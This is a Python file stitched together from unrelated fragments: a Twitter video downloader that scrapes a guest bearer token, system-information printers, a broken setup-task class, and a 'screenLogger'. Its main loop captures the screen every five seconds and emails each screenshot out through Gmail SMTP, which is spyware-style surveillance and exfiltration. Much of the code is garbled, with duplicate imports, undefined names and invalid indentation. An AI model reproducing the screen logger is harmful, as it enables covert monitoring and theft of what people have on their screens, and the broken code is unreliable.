import sys,json,re,shutil,os.path,logging,argparse
from datetime import datetime
import requests
from colorama import init,Fore,Style
import time
import os 
import sys 
import datetime 
import shutil 
import matplotlib.pyplot as plt; plt.rcdefaults() 
import numpy as np 
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os
import time
import smtplib
import autopy
import mplcursors 
from os import path
import platform 
import psutil
import argparse
from notifypy import Notify
from pathlib import Path
import warnings
import pickle 
from datetime import date
import logging
import calendar as c
from time import gmtime, strftime

init()

class DownloadVid():

    def __init__(self,video_url):

        #Extracting video id on the end of tweet url
        video_id = video_url.split('/')[5].split('?')[0] if 's?=' in video_url else video_url.split('/')[5]

        #initiating log
        self.log = {}
        sources = {
            "video_url" : "https://twitter.com/i/videos/tweet/"+video_id,
            "activation_ep" :'https://api.twitter.com/1.1/guest/activate.json',
            "api_ep" : "https://api.twitter.com/1.1/statuses/show.json?id="+video_id
        }

        #Simulating web request
        headers = {'User-agent' : 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0','accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language' : 'es-419,es;q=0.9,es-ES;q=0.8,en;q=0.7,en-GB;q=0.6,en-US;q=0.5'}
        self.session = requests.Session()


        def send_request(self, url,method,headers):
            request = self.session.get(url, headers=headers) if method == "GET" else self.session.post(url, headers=headers)
            if request.status_code == 200:
                return request.text
            else:
                sys.exit("Bad request to {}, status code: {}.\nPlease sumbit an issue in the repo including this info.".format(url,request.status_code))

        #ANonymously geting bearertoken without twitterAPI to get video MP4 url and saving it in log
        token_request = send_request(self,sources["video_url"],"GET",headers)
        bearer_file = re.findall('src="(.*js)',token_request)
        file_content = send_request(self,str(bearer_file[0]),'GET',headers)
        bearer_token_pattern = re.compile('Bearer ([a-zA-Z0-9%-])+')
        bearer_token = bearer_token_pattern.search(file_content)
        headers['authorization'] = bearer_token.group(0)
        self.log['bearer'] = bearer_token.group(0)
        req2 = send_request(self,sources['activation_ep'],'post',headers)
        headers['x-guest-token'] = json.loads(req2)['guest_token']
        self.log['guest_token'] = json.loads(req2)['guest_token']
        self.log['full_headers'] = headers
        api_request = send_request(self,sources["api_ep"],"GET",headers)



        try:
            #extracting tweet information from response text
            videos = json.loads(api_request)['extended_entities']['media'][0]['video_info']['variants']
            self.log['vid_list'] = videos
            bitrate = 0
            for vid in videos:
                if vid['content_type'] == 'video/mp4':
                    if vid['bitrate'] > bitrate:
                        bitrate = vid['bitrate']
                        hq_video_url = vid['url']
            self.url = hq_video_url
        except:
            sys.exit('['+Fore.RED+'+'+Style.RESET_ALL+']'+' No videos were found.')



    #Saving video, filename is optional
    def save_video(self,*filename):
        url = self.url
        for arg in filename:
            name = filename[0]
            print(filename[0])
        fn = url.split('/')[8].split('?')[0]
        print(fn,"gngngn")
        if (filename):
            fn = name if '.mp4' in name else name+'.mp4'
        ddir = './videos/'
        try:
            os.mkdir(ddir)
            op_dir = os.path.join(ddir, fn)
        except:
            op_dir = os.path.join(ddir, fn)
        print(op_dir)
        with requests.get(url, stream=True) as r:
            with open(op_dir, 'wb') as f:
                shutil.copyfileobj(r.raw, f)
        print('['+Fore.GREEN+'+'+Style.RESET_ALL+'] '+'File successfully saved as '+fn+' !')
        return fn




def saveVideo(url, *filename):
    z = DownloadVid(url)
    file = z.save_video(*filename)
    return file
    


# saveVideo("https://twitter.com/nailainayat/status/1272919473792651271")

#https://twitter.com/ishanali101/status/1229445162662846465

def get_account():   
    #time_acc = datetime.datetime.now()
    t = date.today()
    m_d = date.today()
    day = c.day_name[m_d.weekday()] #return the day of week
    t_n = strftime("%H:%M:%S",gmtime())
    time_now = t.strftime(f"{day} %B %d")
    print(f"User: {user_acc}")
    print(f"Last login: ", time_now, t_n)      
    

def get_platform():
    print(f"System Name: {system_name}")
    print(f"Platform: {user_platform}")
    print(f"Platform Release: {user_platform_rel} \n")
    print(f'Total Bytes Sent: {get_size(bytes_sent)}')
    print(f'Total Bytes Recieved: {get_size(bytes_recv)} \n')
    print(f'Physical Core Count: {physicalcore_count}')
    print(f'Total Core Count: {totalcore_count}')

# screenLogger

gmail_user ='abc@gmail.com' #Your email address
gmail_pwd ='password' #Your email password
    

def mail(attach):  #defining function for email
   
   bitmap = autopy.bitmap.capture_screen()
   bitmap.save("src.png")

   msg = MIMEMultipart()
   part = MIMEBase('application', 'octet-stream')
   part.set_payload(open(attach, 'rb').read())
   encoders.encode_base64(part)
   part.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(attach))
   msg.attach(part)
   
   try:
       mailServer = smtplib.SMTP("smtp.gmail.com", 587)
       mailServer.ehlo()
       mailServer.starttls()
       mailServer.ehlo()
       mailServer.login(gmail_user, gmail_pwd)
       mailServer.sendmail(gmail_user,gmail_user, msg.as_string())
       mailServer.close()
   except smtplib.socket.gaierror:
       pass
   except (gaierror, ConnectionRefusedError):
       pass
   except smtplib.SMTPServerDisconnected:
       pass
   except smtplib.SMTPException:
       pass

def tmpdownload(url, name=None, subdir=''):
    if name is None:
        name = os.path.basename(url)

    _name = os.path.join(TEMP_DIR.name, subdir, name)
    return urlretrieve(url, _name)

def find_library(libname):
    if SYS_PLATFORM == 'win32': return

    # TODO: This

def yes_no(question):
    while True:  # spooky
        ri = raw_input('{} (y/n): '.format(question))
        if ri.lower() in ['yes', 'y']: return True
        elif ri.lower() in ['no', 'n']: return False


class SetupTask(object):
    def __getattribute__(self, item):
        try:
            if item.endswith('_dist'):
                try:
                # check for dist aliases, ex: setup_dist -> setup_win32
                return object.__getattribute__(self, item.rsplit('_', 1)[0] + '_' + SYS_PLATFORM)
            except:
                try:
                    # If there's no dist variant, try to fallback to the generic, ex: setup_dist -> setup
                    return object.__getattribute__(self, item.rsplit('_', 1)[0])
                except:
                    pass

        return object.__getattribute__(self, item)
            # Check for platform variant of function first
            return object.__getattribute__(self, item + '_' + SYS_PLATFORM)
        except:
            pass
    @classmethod
    def run(cls):
        self = cls()
        if not self.check():
            self.setup(self.download())

        def check(self):
            """
        Check to see if the component exists and works
        """
        pass

    def download(self):
        """
        Download the component
        """
        pass

    def setup(self, data):
        """
        Install the componenet and any other required tasks
        """
        pass



 
def main(): #defining function to repeat
    while True:
         mail("src.png")
         time.sleep(5)
 
if __name__=='__main__':
    main()